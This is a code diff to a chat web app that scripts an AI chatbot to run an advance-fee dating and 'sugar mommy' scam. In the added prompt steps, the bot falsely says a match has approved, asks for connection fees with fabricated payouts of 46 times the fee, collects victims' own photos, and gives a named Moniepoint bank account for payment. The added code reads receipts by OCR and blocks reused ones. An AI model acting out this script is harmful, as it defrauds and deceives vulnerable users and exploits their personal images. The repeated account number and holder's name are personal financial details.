@@ -328,6 +328,23 @@
     Question 3 TRIGGER: User specifies connection choice.
     - Base message: "alright before you can be able to connect with anyone, You have to register and become a member of our platform Now To activate your Membership, Now To activate your Member ID you have to make the payment of [Total Fee] This fee helps cover operational costs, Facebook ads and improve match quality, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
 
+    Question 5 TRIGGER: User submits or confirms the selected profile picture of the person they want to get connected with.
+    - Base message: "Your payment is still under verification, please send a clear picture of yourself so we can submit it to your match." (Rephrase uniquely)
+
+    Question 6 TRIGGER: User sends their picture.
+    - Base message: "Please check back and message me after a few minutes. By then, I will let you know if your match has approved to connect with you." (Rephrase uniquely)
+    - Important Rule: When the user replies with ok, alright, or confirms they understand, you must reply: "Your match has not yet responded. When they approve your request, I will let you know immediately."
+
+    Question 7 TRIGGER: Begin this question after informing them that their match has not yet responded and transitioning to the fee agreement step:
+    - [For Sugar Mommy / Sugar Daddy]: 
+      - Base message: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. So how much can you afford to pay for expenses?"
+      - AI Calculation Strategy: When the user replies with their chosen fee, validate that the amount is between ₦4,500 and ₦20,000. If valid, calculate their expected payout by multiplying their input by 46 (e.g. ₦20,000 * 46 = ₦920,000), state their expected payout to them, and proceed to provide the Moniepoint payment account (6765911129, Akono Mercy Uka). If out of bounds, politely correct them.
+    - [For Get paid for chatting with rich people abroad]: 
+      - Base message: "Your match has approved their interest! To finalize, a connection fee is required to cover profile verification. For example, if your connection fee is $20, you would be paid $920 per service. So how much can you afford to pay for expenses?"
+      - AI Calculation Strategy: When the user replies with their chosen fee in dollars, validate that the amount is between $10 and $40. If valid, calculate their expected payout by multiplying their input by 46 (e.g. $20 * 46 = $920), state their expected payout in dollars to them, and proceed to provide the Moniepoint payment account (6765911129, Akono Mercy Uka). If out of bounds, politely correct them.
+    - [For Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group]: "Your match has approved their interest! To finalize, a connection fee of ₦3,000 is required to cover profile verification. Do you agree? (YES/NO)"
+    - [For Serious relationship in Nigeria & Serious relationship outside Nigeria]: "Your match has approved their interest! To finalize, a connection fee of ₦4,000 is required to cover profile verification. Do you agree? (YES/NO)"
+
     Question 8 TRIGGER: User completed match gallery selection form and agreed to connection fee.
     - Base message: "alright, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
 
@@ -370,6 +387,8 @@
 
     let pendingCategoryPage = localStorage.getItem('pending_category_page') || '';
     let pendingCategoryName = localStorage.getItem('pending_category_name') || '';
+    let usedReceiptNumbers = JSON.parse(localStorage.getItem('used_receipt_numbers')) || [];
+    let isSending = false; // Prevents multiple fast-clicks
 
     window.addEventListener('DOMContentLoaded', () => {
         loadChatHistory();
@@ -428,16 +447,23 @@
 
     function checkReturnHandshake() {
         const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('returned') === 'true') {
-            const amount = urlParams.get('amount') || '3000';
+        if (urlParams.get('returned') === 'gallery') {
+            const savedImages = JSON.parse(localStorage.getItem('pending_match_images') || '[]');
             
-            localStorage.removeItem('membership_fee_paid');
-            localStorage.removeItem('unlocked_gallery_url');
-            localStorage.removeItem('unlocked_gallery_name');
-            checkPersistentButtonState();
+            if (savedImages.length > 0) {
+                savedImages.forEach(imgUrl => {
+                    chatHistory.push({
+                        role: "user",
+                        content: "Here is the picture of the person I am interested in.",
+                        imageUrl: imgUrl,
+                        displayCaption: "Here is the person I am interested in."
+                    });
+                });
+                localStorage.removeItem('pending_match_images');
+            }
 
-            // Handshake passed invisibly in backend system prompt
-            const backendPrompt = `[System Backend Event]: Candidate completed match selection form and agreed to connection fee of ₦${amount}. Send Question 8 trigger now providing Moniepoint account (6765911129, Akono Mercy Uka).`;
+            // Backend system event prompt for AI continuation
+            const backendPrompt = `[System Backend Event]: Candidate submitted selected profile photo(s) from the match gallery. Send Question 8 trigger now providing Moniepoint account (6765911129, Akono Mercy Uka) and requesting connection fee payment.`;
             chatHistory.push({ role: "system", content: backendPrompt });
             saveChatHistory();
             window.history.replaceState({}, document.title, window.location.pathname);
@@ -519,7 +545,28 @@
 
     document.getElementById('messageInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
 
+    // Extract receipt number patterns from OCR text (OPay, Moniepoint, Palmpay, GTBank, Zenith, etc.)
+    function extractReceiptNumber(text) {
+        if (!text) return null;
+        // Matches Transaction No, Session ID, Ref No, Transaction Ref, etc.
+        const patterns = [
+            /(?:Transaction\s*No\.?|Session\s*ID|Ref\s*No\.?|Txn\s*ID|Reference)\s*[:\s]*([A-Za-z0-9]{10,35})/i,
+            /\b(202\d{10,25})\b/, // Common 202x bank session ID timestamps
+            /\b([0-9]{15,30})\b/   // Raw long numeric transaction reference numbers
+        ];
+
+        for (let pattern of patterns) {
+            const match = text.match(pattern);
+            if (match && match[1]) {
+                return match[1].trim();
+            }
+        }
+        return null;
+    }
+
     async function sendMessage() {
+        if (isSending) return; // Prevent double sending on fast multi-clicks
+
         const textInput = document.getElementById('messageInput');
         const fileInput = document.getElementById('fileInput');
         const text = textInput.value.trim();
@@ -527,23 +574,18 @@
 
         if (!text && !file && !recordedAudioBlob) return;
 
+        isSending = true;
+
         let apiUserPayload = text || "Uploaded image/receipt";
         let displayObj = { role: "user", content: text };
 
-        if (file && file.type.startsWith('image/')) {
-            const imgUrl = URL.createObjectURL(file);
+        const attachedFile = file; // Save local reference before clear
+
+        // 1. Render immediate preview on screen BEFORE reading receipt in background
+        if (attachedFile && attachedFile.type.startsWith('image/')) {
+            const imgUrl = URL.createObjectURL(attachedFile);
             displayObj.imageUrl = imgUrl;
             displayObj.displayCaption = text;
-
-            appendLoadingMessage('Reading payment receipt...');
-            try {
-                const ocrResult = await Tesseract.recognize(file, 'eng');
-                const extractedText = ocrResult.data.text;
-                apiUserPayload += ` [Backend OCR Extracted Text: ${extractedText}]`;
-            } catch(e) {
-                apiUserPayload += ` [Backend Image Uploaded]`;
-            }
-            removeLoadingMessage();
         } else if (recordedAudioBlob) {
             apiUserPayload = "[User sent voice note]";
             displayObj.content = "🎤 Voice Note";
@@ -552,6 +594,7 @@
         displayObj.content = apiUserPayload;
         chatHistory.push(displayObj);
 
+        // Clear UI inputs immediately
         textInput.value = '';
         clearFile();
         recordedAudioBlob = null;
@@ -559,12 +602,45 @@
         saveChatHistory();
         renderChatMessages();
 
+        // 2. Perform OCR reading completely in the background
+        if (attachedFile && attachedFile.type.startsWith('image/')) {
+            appendLoadingMessage('Typing...'); // Standard subtle typing status
+            try {
+                const ocrResult = await Tesseract.recognize(attachedFile, 'eng');
+                const extractedText = ocrResult.data.text;
+                apiUserPayload += ` [Backend OCR Extracted Text: ${extractedText}]`;
+
+                // Check for Duplicate Receipt Numbers
+                const receiptNo = extractReceiptNumber(extractedText);
+                if (receiptNo) {
+                    if (usedReceiptNumbers.includes(receiptNo)) {
+                        removeLoadingMessage();
+                        const duplicateMsg = "This receipt has already been used by a different user. Please make your payment and send a valid receipt.";
+                        chatHistory.push({ role: "assistant", content: duplicateMsg });
+                        saveChatHistory();
+                        renderChatMessages();
+                        isSending = false;
+                        return; // Stop execution, do not call AI
+                    } else {
+                        // Store new receipt number for future verification
+                        usedReceiptNumbers.push(receiptNo);
+                        localStorage.setItem('used_receipt_numbers', JSON.stringify(usedReceiptNumbers));
+                    }
+                }
+            } catch(e) {
+                apiUserPayload += ` [Backend Image Uploaded]`;
+            }
+            // Update the user payload in history with extracted text before sending to AI
+            chatHistory[chatHistory.length - 1].content = apiUserPayload;
+            saveChatHistory();
+        } else {
+            appendLoadingMessage('Typing...');
+        }
+
         triggerDeepSeekResponse();
     }
 
     async function triggerDeepSeekResponse() {
-        const loadingId = appendLoadingMessage();
-
         const cleanApiPayload = chatHistory.map(msg => ({
             role: msg.role === 'system' ? 'system' : msg.role === 'assistant' ? 'assistant' : 'user',
             content: stripAsterisks(msg.content || 'Image attached')
@@ -614,6 +690,8 @@
             chatHistory.push({ role: "assistant", content: "Network connection error. Please try again." });
             saveChatHistory();
             renderChatMessages();
+        } finally {
+            isSending = false; // Re-enable sending
         }
     }
 
@@ -667,6 +745,7 @@
     }
 
     function appendLoadingMessage(txt = 'Typing...') {
+        removeLoadingMessage();
         const chatBox = document.getElementById('chatBox');
         const div = document.createElement('div');
         div.className = `message bot loading`;
